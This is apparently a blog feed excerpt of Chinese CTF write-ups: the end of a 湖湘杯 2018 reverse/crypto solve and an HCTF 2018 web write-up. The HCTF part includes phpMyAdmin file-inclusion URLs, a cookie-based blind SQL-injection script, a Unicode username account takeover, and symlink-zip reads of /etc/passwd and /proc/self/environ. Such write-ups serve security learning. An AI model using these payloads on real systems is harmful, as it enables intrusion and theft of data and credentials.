0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,</span><br><span class="line"></span><br><span class="line">                               0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,</span><br><span class="line"></span><br><span class="line">                               0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,</span><br><span class="line"></span><br><span class="line">                               0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,</span><br><span class="line"></span><br><span class="line">                               0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,</span><br><span class="line"></span><br><span class="line">                               0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,</span><br><span class="line"></span><br><span class="line">                               0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,</span><br><span class="line"></span><br><span class="line">                               0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,</span><br><span class="line"></span><br><span class="line">                               0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,</span><br><span class="line"></span><br><span class="line">                               0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,</span><br><span class="line"></span><br><span class="line">                               0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,</span><br><span class="line"></span><br><span class="line">                               0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,</span><br><span class="line"></span><br><span class="line">                               0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,</span><br><span class="line"></span><br><span class="line">                               0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key &#x3D; [50, 97, 52, 57, 102, 54, 57, 99, 51, 56, 51, 57, 53, 99, 100, 101, 57, 54, 100, 54, 100, 101, 57, 54, 100, 54, 102, 52, 101, 48, 50, 53, 52, 56, 52, 57, 53, 52, 100, 54, 49, 57, 53, 52, 52, 56, 100, 101, 102, 54, 101, 50, 100, 97, 100, 54, 55, 55, 56, 54, 101, 50, 49, 100, 53, 97, 100, 97, 101, 54]</span><br><span class="line"> </span><br><span class="line">f &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,35):</span><br><span class="line">       for j in range(0,256):</span><br><span class="line">        v5 &#x3D; chr(j)</span><br><span class="line">        v6 &#x3D; (ord(v5)&gt;&gt;4)%16</span><br><span class="line">        v7 &#x3D; (16*ord(v5)&gt;&gt;4)%16</span><br><span class="line">v8 &#x3D; key[2*i]</span><br><span class="line">   if v8 &lt; 48 or v8 &gt; 57:</span><br><span class="line">     v9 &#x3D; v8 - 87</span><br><span class="line">       else:</span><br><span class="line">v9 &#x3D; v8 - 48</span><br><span class="line">v11 &#x3D; v9*16</span><br><span class="line">v10 &#x3D; key[2*i+1]</span><br><span class="line">if v10 &lt; 48 or v10 &gt; 57:</span><br><span class="line">v12 &#x3D; v10 - 87</span><br><span class="line">else:</span><br><span class="line">v12 &#x3D; v10 - 48</span><br><span class="line">if box[16*v6+v7] &#x3D;&#x3D; ((v11+v12)^0x19):</span><br><span class="line">f +&#x3D; v5</span><br><span class="line">print f</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image024.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Common-Crypto"><a href="#Common-Crypto" class="headerlink" title="Common Crypto"></a>Common Crypto</h2><p>拿到exe打开要求输入flag，随便输点东西回车程序就关了。于是直接扔到IDA里看。（截图中变量名有的经过自定义，为了方便看）</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image064.jpg"></p><p>gets获取输入的flag，然后进入sub_140001000(&amp;key);这个函数查看。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image066.jpg"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image068.jpg"></p><p>能够清晰的找到这里的key值，把它取出来</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image070.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key &#x3D; [0x1b, 0x2e, 0x35, 0x46, 0x58, 0x6e ,0x72, 0x86, 0x9b,0xa7,0xb5,</span><br><span class="line"></span><br><span class="line">0xc8,0xd9,0xef,0xff,0xc]</span><br></pre></td></tr></table></figure><p>下面的处理过程经过和AES加密的代码对比，应该是正常的加密过程。</p><p>再进入<code>sub_1400012A0((unsigned __int8 *)&amp;flag, (__int64)&amp;key);</code>这个函数查看。基本上确定是常规的AES加密，代码过多不再贴图。</p><p>但是有个问题是key的长度是16，加密后做比较的字符串长度却太长了</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image072.jpg"></p><p>按照原理，密钥长度是根据明文扩展的，而明文和密文应该是一样长，于是尝试把这段密文分成两半。分别尝试解密过程。幸运的是，前半段就成功了。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image074.jpg"></p><p>解出来一堆数字，再结合刚刚后半段的数字，猜测是十六进制转字符串。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image076.jpg"></p><p>自己添加个}，尝试提交成功。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag:  hxb2018&#123;aa8871759de6f35215205566&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>累了，睡了，醒来学习二进制、、、 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首先，这次湖湘杯的web出的真的差，多种非预期，多种环境问题，题目多次上线下线，还没有实时的分数榜？？？因为这次逆向和pwn不强，我们应该是</summary>
      
    
    
    
    <category term="CTF" scheme="v0w.top/categories/CTF/"/>
    
    
    <category term="SSTI" scheme="v0w.top/tags/SSTI/"/>
    
    <category term="反序列化" scheme="v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="SQL注入" scheme="v0w.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="SSRF" scheme="v0w.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018-WP</title>
    <link href="v0w.top/2018/11/12/HCTF-WP/"/>
    <id>v0w.top/2018/11/12/HCTF-WP/</id>
    <published>2018-11-11T16:00:00.000Z</published>
    <updated>2020-07-18T10:51:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参加HCTF，但是熬了两天也没什么输出==、真的体会到和真正的大佬之间的差距，在强大的表哥的带领下取得12名的成绩，我感觉还是很不错。只可惜还进不了决赛、、、</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>一个CVE</p><p>参考<a href="http://www.lsafe.org/?p=300">CVE-2018-12613 PHPMYADMIN后台文件包含分析</a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;warmup.2018.hctf.io&#x2F;index.php?file&#x3D;hint.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;warmup.2018.hctf.io&#x2F;index.php?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541771012184.png"></p><h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p><code>www.zip</code>有源码泄露</p><p>审计源码发现<code>admin/login.php</code> 直接在登录页面想利用SQL注入，发现是有过滤的。</p><p>但是在<code>include/member.php</code>中发现</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181111193529.png"></p><p>也就是说 <code>Cookie</code>中存在SQL注入，且无过滤，有一个<code>json_decode</code>，需要用json方式传入Cookie，然后<code>cookie注入</code></p><p>但是测试<code>union</code>注入和报错注入都不行，应该是只能时间盲注，并且需要利用Unicode绕过，jsondecode可以直接解Unicode。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: islogin&#x3D;1;login_data&#x3D;&#123;&quot;admin_user&quot;:&quot;\u0061\u0064\u006d\u0069\u006e\u0027\u0020\u0061\u006e\u0064\u0020\u0069\u0066\u0028\u0028\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u0028\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u0029\u002c\u0031\u002c\u0031\u0029\u003d\u0027\u0068\u0027\u0029\u002c\u0073\u006c\u0065\u0065\u0070\u0028\u0035\u0029\u002c\u0031\u0029\u0023&quot;,&quot;admin_password&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>小脚本写一写：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicode</span>(<span class="params">s</span>):</span></span><br><span class="line">    unis = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        unis += <span class="string">&#x27;\u00&#x27;</span>+i.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> unis</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://kzone.2018.hctf.io/admin/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;islogin&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;login_data&quot;</span>:<span class="string">&#x27;&#123;&quot;admin_user&quot;:&quot;admin&quot;,&quot;admin_pass&quot;:true&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">dic = string.letters + string.digits + <span class="string">&quot;&#123;&#125;,-_&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and if((substr((database()),%d,1)=&#x27;%s&#x27;),sleep(5),1)#&quot; %(i,c)</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)=&#x27;%s&#x27;),sleep(5),1)#&quot; % (i,c)</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27; and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;F1444g&#x27;),%d,1)=&#x27;%s&#x27;),sleep(5),1)#&quot; % (i,c)</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27; and if((substr((select binary F1a9 from F1444g),%d,1)=&#x27;%s&#x27;),sleep(5),1)#&quot;</span> % (i,c)</span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        payload = unicode(payload)</span><br><span class="line">        cookies = &#123;</span><br><span class="line">            <span class="string">&quot;islogin&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;login_data&quot;</span>:<span class="string">&#x27;&#123;&quot;admin_user&quot;:&quot;&#x27;</span>+payload+<span class="string">&#x27;&quot;,&quot;admin_pass&quot;:true&#125;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time_start = time.time()</span><br><span class="line">        content = requests.get(url=url,cookies=cookies).content</span><br><span class="line">        time_end = time.time()</span><br><span class="line">        <span class="comment">#print time_end - time_start</span></span><br><span class="line">        <span class="keyword">if</span> time_end - time_start &gt;= <span class="number">5</span>:</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">DBname:hctfkouzone</span></span><br><span class="line"><span class="string">TBname:F1444g,fish_admin,fish_ip,fish_user,fis</span></span><br><span class="line"><span class="string">Colname:F1a9</span></span><br><span class="line"><span class="string">DumpData:</span></span><br><span class="line"><span class="string">flag:hctf&#123;4526a8cbd741b3f790f95ad32c2514b9&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>出题人意图不难揣测，以admin身份登录系统就行。</p><p>但是一开始没找到源码，费了很多功夫才在<a href="https://github.com/woadsl1234/hctf_flask">github上找到源码</a></p><p>在<code>app/routes.py</code>里面看到了这个：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)<span class="comment"># 第一次strlower()</span></span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">            ...</span><br><span class="line"><span class="meta">@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)<span class="comment"># 第二次时strlower()</span></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        ...</span><br><span class="line"><span class="meta">@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])<span class="comment"># 第三次strlower()</span></span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码中共出现三次<code>strlower</code>函数</p><p>跟进，看看这个函数是怎么写的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>搜索这个函数，找到参考文档</p><p>参考<a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a></p><blockquote><p>这个函数会把大写转换为小写，把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子</p><p><code>BIG</code>会被转换为<code>big</code>, <code>ƁƗƓ</code>会被转换为<code>ɓɨɠ</code></p><p>他们对用户名是否重复的判断是执行一次这个函数然后进行比对 ，例如AAA会被变为aaa则和之前已经注册过的aaa重复 ，但是这里出现了一个错误，注册一个<code>ᴬᴬᴬ</code>，经过函数处理后变成了AAA，因为与aaa不同所以注册成功，而在用户点击重置密码的连接的时候，这个函数再次被执行了一次，AAA变成了aaa，导致用户aaa的密码被越权修改</p></blockquote><p>于是思路也就有了：</p><ol><li>注册<code>ᴬdmin</code></li><li>登录<code>ᴬdmin</code>, 会触发第二次转换，但是因为以<code>ᴬdmin</code>登录，所以会变成<code>Admin</code></li><li>再改密码，会触发第三次的转换<code>Admin</code>会变成<code>admin</code>，所以其实这里修改的是admin的密码</li><li>再以admin的身份登录就行了。</li></ol><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20181111210418.png"></p><h2 id="hideandseek"><a href="#hideandseek" class="headerlink" title="hideandseek"></a>hideandseek</h2><p>思路：</p><ol><li>上传shell的zip，<code>phar://</code>读             发现不行，事实上网站是flask搭建的</li><li>上传软链接的zip，因为会自动unzip，然后可以软链接读文件</li></ol><p>发现思路2可行，并且很容易读文件，如<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -si &#x2F;etc&#x2F;passwd link</span><br><span class="line">zip --symlinks test.zip link</span><br></pre></td></tr></table></figure><p>但是在读文件的时候发现了问题，不是在默认的路径<code>/var/www/html/app/*.py</code></p><p>于是尝试读配置文件和log，但是发现环境access.log和error.log读取时发生超时错误</p><p>最终在<code>/proc/self/environ</code>读到了有效信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -si &#x2F;proc&#x2F;self&#x2F;environ env</span><br><span class="line">zip --symlinks env.zip env</span><br></pre></td></tr></table></figure><blockquote><p>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=92739130567fSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.13.12-1<del>stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.13.12.0.2.0-1</del>stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.6NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0</p></blockquote><p>之后又在<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code>中读取到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[uwsgi] module &#x3D; hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable&#x3D;app</span><br></pre></td></tr></table></figure><p>于是得到结论：源码在<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -si &#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py main</span><br><span class="line">zip --symlinks main.zip main</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/logout&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span>():</span></span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><p>拿到源码，关键的几行在</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>也就是说<code>SECRET_KEY</code>是利用mac地址作为随机数种子的，是可以预测生成随机数的序列的，但是需要知道python版本号。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;app&#x2F;main.py 1.txt</span><br><span class="line">zip -y 1.zip 1.txt</span><br></pre></td></tr></table></figure><p>读取到相关信息</p><figure class="highlight 